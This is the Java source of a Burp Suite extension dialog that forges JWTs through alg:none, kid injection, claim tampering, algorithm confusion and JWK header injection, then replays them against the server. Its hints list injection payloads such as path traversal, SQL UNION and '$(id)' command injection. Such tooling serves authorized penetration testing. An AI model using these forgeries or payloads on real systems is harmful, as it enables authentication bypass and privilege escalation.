package com.tk.jwtinspector.ui;


import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.HttpService;
import com.nimbusds.jose.util.Base64URL;
import com.nimbusds.jose.JOSEException;
import com.nimbusds.jose.jwk.RSAKey;
import com.tk.jwtinspector.detection.DetectedToken;
import com.tk.jwtinspector.detection.TokenStore;
import com.tk.jwtinspector.detection.analysis.forge.ForgeAttack;
import com.tk.jwtinspector.detection.analysis.forge.ForgedToken;
import com.tk.jwtinspector.detection.analysis.forge.TokenForger;
import com.tk.jwtinspector.detection.analysis.verify.ForgeVerifier;
import com.tk.jwtinspector.detection.analysis.verify.VerificationResult;
import com.tk.jwtinspector.detection.analysis.jwks.JwksFetcher;
import com.tk.jwtinspector.detection.analysis.jwks.JwksKeys;

import javax.swing.BorderFactory;
import javax.swing.BoxLayout;
import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTabbedPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.Timer;
import javax.swing.SwingWorker;
import javax.swing.ScrollPaneConstants;
import java.util.List;
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.Font;
import java.awt.GridBagConstraints;
import java.awt.GridBagLayout;
import java.awt.Insets;
import java.awt.Toolkit;
import java.awt.Window;
import java.awt.datatransfer.StringSelection;

/**
 * Modal dialog that lets the user generate forged tokens and send them
 * straight to Burp's Repeater for replay.
 *
 * @author TK
 * @since 2026-05-11
 *
 * Purpose: Hosts three tabs (alg:none, kid injection, claim tamper), each
 * exposing Copy and Send-to-Repeater actions on the forged token. The
 * Repeater action replaces the original request's Authorization header
 * (or session cookie if no Authorization is present) with the forged token.
 */
public class ForgeDialog extends JDialog {

    private final DetectedToken token;
    private final TokenStore store;
    private final TokenForger forger = new TokenForger();
    private final MontoyaApi api;

    public ForgeDialog(Window parent, DetectedToken token, TokenStore store, MontoyaApi api) {
        super(parent, "Forge attack token", ModalityType.APPLICATION_MODAL);
        this.token = token;
        this.store = store;
        this.api = api;
        buildUI();
        setLocationRelativeTo(parent);
    }

    private void buildUI() {
        JPanel root = new JPanel(new BorderLayout(0, 12));
        root.setBorder(BorderFactory.createEmptyBorder(16, 16, 16, 16));

        JPanel header = new JPanel();
        header.setLayout(new BoxLayout(header, BoxLayout.Y_AXIS));
        JLabel title = new JLabel("Forging from token: " + token.shortToken());
        title.setFont(title.getFont().deriveFont(Font.BOLD));
        title.setAlignmentX(Component.LEFT_ALIGNMENT);
        header.add(title);
        root.add(header, BorderLayout.NORTH);

        JTabbedPane tabs = new JTabbedPane();
        tabs.addTab("alg:none", new AlgNoneTab());
        tabs.addTab("kid injection", new KidInjectionTab());
        tabs.addTab("Modify claims", new ClaimTamperTab());
        tabs.addTab("alg confusion", new AlgConfusionTab());
        tabs.addTab("JWK injection", new JwkInjectionTab());

        root.add(tabs, BorderLayout.CENTER);

        JPanel buttons = new JPanel(new FlowLayout(FlowLayout.RIGHT, 8, 0));
        JButton close = new JButton("Close");
        close.addActionListener(e -> dispose());
        buttons.add(close);
        root.add(buttons, BorderLayout.SOUTH);

        setContentPane(root);
        pack();
        setSize(Math.max(750, getWidth()), Math.max(600, getHeight()));
    }

    // ---- Tab 1: alg:none ----
    private class AlgNoneTab extends ForgeTab {
        AlgNoneTab() {
            super(ForgeAttack.ALG_NONE);
        }

        @Override
        protected void buildInputs(JPanel inputs) {
            JLabel info = new JLabel("No inputs required - strips the signature and sets alg to 'none'.");
            info.setBorder(BorderFactory.createEmptyBorder(8, 0, 8, 0));
            inputs.add(info, gbc(0, 0, 2));
        }

        @Override
        protected ForgedToken doForge() {
            return forger.forgeAlgNone(token.rawToken());
        }
    }

    // ---- Tab 2: kid injection ----
    private class KidInjectionTab extends ForgeTab {
        private JTextField kidField;
        private JTextField secretField;

        KidInjectionTab() {
            super(ForgeAttack.KID_INJECTION);
        }

        @Override
        protected void buildInputs(JPanel inputs) {
            kidField = new JTextField("../../../dev/null", 30);
            secretField = new JTextField();

            inputs.add(new JLabel("Malicious kid value:"), gbc(0, 0, 1));
            inputs.add(kidField, gbc(1, 0, 1));

            inputs.add(new JLabel("Signing secret:"), gbc(0, 1, 1));
            secretField.setText(crackedSecretOrEmpty());
            secretField.setToolTipText("Secret the server will derive from your malicious kid lookup. "
                    + "Often empty string for /dev/null traversal.");
            inputs.add(secretField, gbc(1, 1, 1));

            inputs.add(hint("Common payloads: ../../../dev/null, x' UNION SELECT 'AAA, $(id), %00"), gbc(0, 2, 2));
        }

        @Override
        protected ForgedToken doForge() {
            return forger.forgeKidInjection(
                    token.rawToken(),
                    kidField.getText(),
                    secretField.getText());
        }
    }

    // ---- Tab 3: Modify claims ----
    private class ClaimTamperTab extends ForgeTab {
        private JTextArea payloadArea;
        private JTextField secretField;

        ClaimTamperTab() {
            super(ForgeAttack.CLAIM_TAMPER);
        }

        @Override
        protected void buildInputs(JPanel inputs) {
            payloadArea = new JTextArea(8, 40);
            secretField = new JTextField();

            payloadArea.setText(originalPayloadJsonOrEmpty());
            payloadArea.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 12));
            payloadArea.setLineWrap(true);
            payloadArea.setWrapStyleWord(false);

            inputs.add(new JLabel("Payload JSON (edit to tamper):"), gbc(0, 0, 2));
            JScrollPane payloadScroll = new JScrollPane(payloadArea);
            payloadScroll.setPreferredSize(new Dimension(500, 140));
            inputs.add(payloadScroll, gbc(0, 1, 2));

            inputs.add(new JLabel("Signing secret:"), gbc(0, 2, 1));
            secretField.setText(crackedSecretOrEmpty());
            inputs.add(secretField, gbc(1, 2, 1));


            inputs.add(hint("Tip: classic attack is flipping admin:false → admin:true, "
                + "or sub: user → sub: administrator. Edit JSON above, then Generate."),
        gbc(0, 3, 2));

        }

        @Override
        protected ForgedToken doForge() {
            return forger.forgeClaimTamper(
                    token.rawToken(),
                    payloadArea.getText(),
                    secretField.getText());
        }
    }

    // ---- Tab 4: algorithm confusion (RS256/ES256 -> HS256) -----
    private class AlgConfusionTab extends ForgeTab {
        private JTextArea pubKeyArea;
        private JTextArea payloadArea;
        private JButton fetchButton;

        AlgConfusionTab() {
            super(ForgeAttack.ALG_CONFUSION);
        }

        @Override
        protected void buildInputs(JPanel inputs) {
            pubKeyArea = new JTextArea(6, 40);
            pubKeyArea.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 12));
            pubKeyArea.setLineWrap(true);
            pubKeyArea.setWrapStyleWord(false);
            pubKeyArea.setToolTipText(
                    "The server's PUBLIC key, exactly as it stores it - usually PEM" +
                    "incl. the BEGIN/END lines and a trailing newline."
                    );

            fetchButton = new JButton("Fetch key from server");
            fetchButton.setToolTipText("Downloads the server's JWKS (/.well-known/jwks.json, then /jwks.json) "
                + "and fills in the public key that matches this token's kid.");
            fetchButton.setEnabled(token.originalRequest() != null);
            fetchButton.addActionListener(e -> onFetchKey());

            JPanel keyHeader = new JPanel(new BorderLayout());
            keyHeader.add(new JLabel("Server public key (PEM):"), BorderLayout.WEST);
            keyHeader.add(fetchButton, BorderLayout.EAST);
            inputs.add(keyHeader, gbc(0, 0, 2));

            JScrollPane keyScroll = new JScrollPane(pubKeyArea);
            keyScroll.setPreferredSize(new Dimension(500, 120));
            inputs.add(keyScroll, gbc(0, 1, 2));

            payloadArea = new JTextArea(6, 40);
            payloadArea.setText(originalPayloadJsonOrEmpty());
            payloadArea.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 12));
            payloadArea.setLineWrap(true);
            payloadArea.setWrapStyleWord(false);

            inputs.add(new JLabel("Payload JSON (optional tamper):"), gbc(0, 2, 2));
            JScrollPane payloadScroll = new JScrollPane(payloadArea);
            payloadScroll.setPreferredSize(new Dimension(500, 120));
            inputs.add(payloadScroll, gbc(0, 3, 2));

            inputs.add(hint("Get the key from the JWKS endpoint (/.well-known/jwks.json), "
                + "the TLS cert, or recover it from two captured tokens (rsa_sign2n). "
                + "If it fails, retry with/without a trailing newline."),
        gbc(0, 4, 2));

        }

        @Override
        protected ForgedToken doForge() {
            return forger.forgeAlgConfusion(
                    token.rawToken(),
                    pubKeyArea.getText(),
                    payloadArea.getText());
        }

            private void onFetchKey() {
            HttpRequest original = token.originalRequest();
            if (original == null) {
                setStatus("No original request captured, so the server's host is unknown.",
                        new Color(0xC0, 0x10, 0x10));
                return;
            }

            HttpService service = original.httpService();
            List<String> urls = JwksKeys.defaultUrls(service.secure(), service.host(), service.port());
            String kid = JwksKeys.kidOf(token.rawToken());

            fetchButton.setEnabled(false);
            setStatus("Fetching JWKS from " + service.host() + "...", new Color(0x40, 0x60, 0x80));

            JwksFetcher fetcher = new JwksFetcher(api);
            new SwingWorker<JwksFetcher.Result, Void>() {
                @Override
                protected JwksFetcher.Result doInBackground() {
                    return fetcher.fetchPem(urls, kid);
                }

                @Override
                protected void done() {
                    fetchButton.setEnabled(true);
                    try {
                        JwksFetcher.Result r = get();
                        if (r.ok()) {
                            pubKeyArea.setText(r.pem());
                            pubKeyArea.setCaretPosition(0);
                            setStatus("Loaded public key from " + r.sourceUrl(), new Color(0x1A, 0x86, 0x1A));
                        } else {
                            setStatus(r.error(), new Color(0xC0, 0x10, 0x10));
                        }
                    } catch (Exception ex) {
                        setStatus("Fetch failed: " + ex.getMessage(), new Color(0xC0, 0x10, 0x10));
                    }
                }
            }.execute();
        }
    }

    // ---- Tab 5: JWK header injection ----
    private class JwkInjectionTab extends ForgeTab {
        private JTextArea payloadArea;
        private RSAKey attackerKey;   // created on first Generate, then reused

        JwkInjectionTab() {
            super(ForgeAttack.JWK_INJECTION);
        }

        @Override
        protected void buildInputs(JPanel inputs) {
            payloadArea = new JTextArea(6, 40);
            payloadArea.setText(originalPayloadJsonOrEmpty());
            payloadArea.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 12));
            payloadArea.setLineWrap(true);
            payloadArea.setWrapStyleWord(false);

            inputs.add(new JLabel("Payload JSON (optional tamper):"), gbc(0, 0, 2));
            JScrollPane payloadScroll = new JScrollPane(payloadArea);
            payloadScroll.setPreferredSize(new Dimension(500, 120));
            inputs.add(payloadScroll, gbc(0, 1, 2));

            inputs.add(hint("No key needed: the first Generate creates a fresh RSA key pair, "
                    + "embeds its public half in the 'jwk' header and signs with the private half. "
                    + "The same key is reused until you close this dialog."), gbc(0, 2, 2));
        }

        @Override
        protected ForgedToken doForge() {
            if (attackerKey == null) {
                try {
                    attackerKey = TokenForger.newAttackerKey();
                } catch (JOSEException e) {
                    return ForgedToken.failure(ForgeAttack.JWK_INJECTION,
                            "Could not generate a key pair: " + e.getMessage());
                }
            }
            return forger.forgeJwkInjection(token.rawToken(), attackerKey, payloadArea.getText());
        }
    }

    // ---- Shared base for the three tab panels ----
    private abstract class ForgeTab extends JPanel {
        protected final ForgeAttack attack;
        private final JTextArea outputArea = new JTextArea(4, 40);
        private final JButton generateButton = new JButton("Generate forged token");
        private final JButton copyButton = new JButton("Copy");
        private final JButton sendToRepeaterButton = new JButton("Send to Repeater");
        private final JButton verifyButton = new JButton("Verify on server");
        private final JLabel statusLabel = new JLabel(" ");
        private final JTextArea warningsArea = new JTextArea(3, 40);

        ForgeTab(ForgeAttack attack) {
            this.attack = attack;
            setLayout(new BorderLayout(0, 8));
            setBorder(BorderFactory.createEmptyBorder(12, 12, 12, 12));

            JTextArea desc = new JTextArea(attack.description());
            desc.setEditable(false);
            desc.setLineWrap(true);
            desc.setWrapStyleWord(true);
            desc.setOpaque(false);
            desc.setFont(desc.getFont().deriveFont(Font.PLAIN));
            desc.setBorder(BorderFactory.createEmptyBorder(0, 0, 8, 0));
            add(desc, BorderLayout.NORTH);

            JPanel center = new WidthTrackingPanel(new BorderLayout(0, 8));

            JPanel inputs = new JPanel(new GridBagLayout());
            buildInputs(inputs);
            center.add(inputs, BorderLayout.NORTH);

            JPanel outputBlock = new JPanel(new BorderLayout(0, 4));
            outputBlock.add(new JLabel("Forged token:"), BorderLayout.NORTH);
            outputArea.setEditable(false);
            outputArea.setLineWrap(true);
            outputArea.setWrapStyleWord(false);
            outputArea.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 12));
            outputBlock.add(new JScrollPane(outputArea), BorderLayout.CENTER);

            JPanel outputRow = new JPanel(new FlowLayout(FlowLayout.RIGHT, 8, 0));
            copyButton.setEnabled(false);
            sendToRepeaterButton.setEnabled(false);
            verifyButton.setEnabled(false);
            verifyButton.setToolTipText("Replays the forged token against the server and " 
                    + "comapares the response to the real token. Most meaningful for a token "
                    + " captured in request to a protected endpoint. ");
            outputRow.add(copyButton);
            outputRow.add(sendToRepeaterButton);
            outputRow.add(verifyButton);
            outputBlock.add(outputRow, BorderLayout.SOUTH);

            center.add(outputBlock, BorderLayout.CENTER);

            warningsArea.setEditable(false);
            warningsArea.setLineWrap(true);
            warningsArea.setWrapStyleWord(true);
            warningsArea.setOpaque(false);
            warningsArea.setFont(warningsArea.getFont().deriveFont(Font.ITALIC, 11f));
            warningsArea.setForeground(new Color(0x60, 0x60, 0x60));
            JPanel warningsBlock = new JPanel(new BorderLayout(0, 4));
            warningsBlock.add(new JLabel("When this attack succeeds:"), BorderLayout.NORTH);
            warningsBlock.add(warningsArea, BorderLayout.CENTER);
            center.add(warningsBlock, BorderLayout.SOUTH);

            JScrollPane centerScroll = new JScrollPane(center, ScrollPaneConstants.VERTICAL_SCROLLBAR_AS_NEEDED, ScrollPaneConstants.HORIZONTAL_SCROLLBAR_NEVER);
            centerScroll.setBorder(null);
            centerScroll.getVerticalScrollBar().setUnitIncrement(16);
            add(centerScroll, BorderLayout.CENTER);

            JPanel bottom = new JPanel(new BorderLayout(0, 6));
            statusLabel.setForeground(new Color(0x40, 0x60, 0x80));
            bottom.add(statusLabel, BorderLayout.NORTH);
            JPanel genRow = new JPanel(new FlowLayout(FlowLayout.RIGHT, 0, 0));
            genRow.add(generateButton);
            bottom.add(genRow, BorderLayout.SOUTH);
            add(bottom, BorderLayout.SOUTH);

            generateButton.addActionListener(e -> onGenerate());
            copyButton.addActionListener(e -> onCopy());
            sendToRepeaterButton.addActionListener(e -> onSendToRepeater());
            verifyButton.addActionListener(e -> onVerify());

        }

        protected abstract void buildInputs(JPanel inputs);
        protected abstract ForgedToken doForge();

        private void onGenerate() {
            ForgedToken result = doForge();
            if (result.success()) {
                outputArea.setText(result.forgedToken());
                outputArea.setCaretPosition(0);
                copyButton.setEnabled(true);
                sendToRepeaterButton.setEnabled(token.originalRequest() != null);
                verifyButton.setEnabled(token.originalRequest() != null);
                statusLabel.setText("Forged successfully.");
                statusLabel.setForeground(new Color(0x1A, 0x86, 0x1A));

                StringBuilder warnings = new StringBuilder();
                for (String w : result.warnings()) {
                    warnings.append("\u2022 ").append(w).append('\n');
                }
                warningsArea.setText(warnings.toString().trim());
            } else {
                outputArea.setText("");
                copyButton.setEnabled(false);
                sendToRepeaterButton.setEnabled(false);
                verifyButton.setEnabled(false);
                statusLabel.setText("Failed: " + result.errorMessage());
                statusLabel.setForeground(new Color(0xC0, 0x10, 0x10));
                warningsArea.setText("");
            }
        }

        private void onCopy() {
            Toolkit.getDefaultToolkit().getSystemClipboard()
                    .setContents(new StringSelection(outputArea.getText()), null);
            String prev = copyButton.getText();
            copyButton.setText("Copied!");
            Timer t = new Timer(1500, ev -> copyButton.setText(prev));
            t.setRepeats(false);
            t.start();
        }

        private void onSendToRepeater() {
            HttpRequest original = token.originalRequest();
            if (original == null) {
                statusLabel.setText("No original request captured for this token.");
                statusLabel.setForeground(new Color(0xC0, 0x10, 0x10));
                return;
            }

            String forged = outputArea.getText();
            if (forged.isEmpty()) {
                statusLabel.setText("Generate a token first.");
                return;
            }

            try {
                HttpRequest modified = replaceTokenInRequest(original, forged);
                String repeaterTabName = "JWT Inspector: " + attack.displayName();
                api.repeater().sendToRepeater(modified, repeaterTabName);

                statusLabel.setText("Sent to Repeater (tab \"" + repeaterTabName + "\").");
                statusLabel.setForeground(new Color(0x1A, 0x86, 0x1A));
            } catch (Throwable t) {
                statusLabel.setText("Failed: " + t.getMessage());
                statusLabel.setForeground(new Color(0xC0, 0x10, 0x10));
            }
        }

        private void onVerify() {

            HttpRequest original = token.originalRequest();
            if (original == null) {
                statusLabel.setText("No original request captured for this token.");
                statusLabel.setForeground(new Color(0xC0, 0x10, 0x10));
                return;
            }
            String forged = outputArea.getText();
            if (forged.isEmpty()) {
                statusLabel.setText("Generate a token first.");
                return;
            }

            HttpRequest attackRequest = replaceTokenInRequest(original, forged);


            verifyButton.setEnabled(false);
            statusLabel.setForeground(new Color(0x40, 0x60, 0x80));
            statusLabel.setText("Replaying forged and original tokens against the server...");


            ForgeVerifier verifier = new ForgeVerifier(api);
            new SwingWorker<VerificationResult, Void>() {
                @Override
                protected VerificationResult doInBackground(){
                    return verifier.verify(original, attackRequest);

                }
                @Override
                protected void done(){
                    verifyButton.setEnabled(true);
                    try {
                        showVerification(get());
                    }
                    catch(Exception ex) {
                        statusLabel.setText("Verify failed: " + ex.getMessage());
                        statusLabel.setForeground(new Color(0xC0, 0x10, 0x10));

                    }
                    
                }
                
            }.execute();
            
        }

        private void showVerification(VerificationResult r) {

            switch (r.verdict()) {
                case ACCEPTED -> {
                    statusLabel.setText("ACCEPTED - " + r.detail());
                    statusLabel.setForeground(new Color(0x1A, 0x86, 0x1A));
                }

                case REJECTED -> {
                    statusLabel.setText("Rejected - " + r.detail());
                    statusLabel.setForeground(new Color(0xC0, 0x40, 0x10));
                }

                case INCONCLUSIVE -> {
                    statusLabel.setText("Inconclusive - " + r.detail());
                    statusLabel.setForeground(new Color(0xE0, 0xA0, 0x10));
                }
                
                case ERROR -> {
                    statusLabel.setText("Error - " + r.detail());
                    statusLabel.setForeground(new Color(0xC0, 0x10, 0x10));
                }
            }
        }


        /**
         * Returns a copy of `original` with the JWT replaced. We try to be smart:
         *   - If Authorization header carried the token, swap it
         *   - If a Cookie carried the token, splice it inside the cookie value
         *   - Otherwise fall back to a body/URL string replace
         */
        private HttpRequest replaceTokenInRequest(HttpRequest original, String forged) {
            String originalToken = token.rawToken();

            switch (token.source()) {
                case REQUEST_HEADER -> {
                    String headerName = token.sourceDetail();
                    if ("Authorization".equalsIgnoreCase(headerName)) {
                        return original.withRemovedHeader("Authorization")
                                .withAddedHeader("Authorization", "Bearer " + forged);
                    }
                    if ("Cookie".equalsIgnoreCase(headerName)) {
                        String oldCookie = original.headerValue("Cookie");
                        if (oldCookie != null && oldCookie.contains(originalToken)) {
                            String newCookie = oldCookie.replace(originalToken, forged);
                            return original.withRemovedHeader("Cookie")
                                    .withAddedHeader("Cookie", newCookie);
                        }
                    }
                    // generic custom header
                    String oldValue = original.headerValue(headerName);
                    if (oldValue != null && oldValue.contains(originalToken)) {
                        String newValue = oldValue.replace(originalToken, forged);
                        return original.withRemovedHeader(headerName)
                                .withAddedHeader(headerName, newValue);
                    }
                }
                case RESPONSE_HEADER, RESPONSE_BODY -> {
                    // Token came from server; no obvious place to inject into the
                    // initiating request. Try the cookie jar as a sensible default
                    // since servers often set tokens via Set-Cookie that the client
                    // then sends as Cookie.
                    String oldCookie = original.headerValue("Cookie");
                    if (oldCookie != null) {
                        String newCookie = oldCookie.contains(originalToken)
                                ? oldCookie.replace(originalToken, forged)
                                : oldCookie + "; session=" + forged;
                        return original.withRemovedHeader("Cookie")
                                .withAddedHeader("Cookie", newCookie);
                    }
                    return original.withAddedHeader("Cookie", "session=" + forged);
                }
                case REQUEST_BODY, REQUEST_PARAM -> {
                    // Fall through to body/URL string replace below
                }
            }

            // Last-resort fallback: replace anywhere in the request body
            String body = original.bodyToString();
            if (body.contains(originalToken)) {
                return original.withBody(body.replace(originalToken, forged));
            }

            // Couldn't find the token anywhere to substitute — append as Authorization
            return original.withAddedHeader("Authorization", "Bearer " + forged);
        }

        protected GridBagConstraints gbc(int x, int y, int width) {
            GridBagConstraints c = new GridBagConstraints();
            c.gridx = x;
            c.gridy = y;
            c.gridwidth = width;
            c.fill = GridBagConstraints.HORIZONTAL;
            c.weightx = 1.0;
            c.anchor = GridBagConstraints.WEST;
            c.insets = new Insets(4, 4, 4, 4);
            return c;
        }

        /** Small italic, wrapping, read-only hint text. Plain text only: Burp's
 *  look-and-feel doesn't render HTML in labels, so <html> tags show raw. */

        protected JTextArea hint(String text) {
            JTextArea area = new JTextArea(text, 0, 40);
            area.setEditable(false);
            area.setLineWrap(true);
            area.setWrapStyleWord(true);
            area.setOpaque(false);
            area.setFont(area.getFont().deriveFont(Font.ITALIC, 11f));
            area.setForeground(new Color(0x60, 0x60, 0x60));
            area.setBorder(BorderFactory.createEmptyBorder(8, 0, 0, 0));
            return area;

        }

        /** Lets subclasses report progress in the shared status line. */
        protected void setStatus(String text, Color color) {
            statusLabel.setText(text);
            statusLabel.setForeground(color);
            statusLabel.setToolTipText(text);
        }
    }

    // ---- Helpers ----
    private String crackedSecretOrEmpty() {
        String cracked = store.crackedSecretFor(token.rawToken());
        return cracked != null ? cracked : "";
    }

    private String originalPayloadJsonOrEmpty() {
        try {
            String[] parts = token.rawToken().split("\\.", -1);
            if (parts.length < 2) return "";
            return Base64URL.from(parts[1]).decodeToString();
        } catch (Exception e) {
            return "";
        }
    }
}
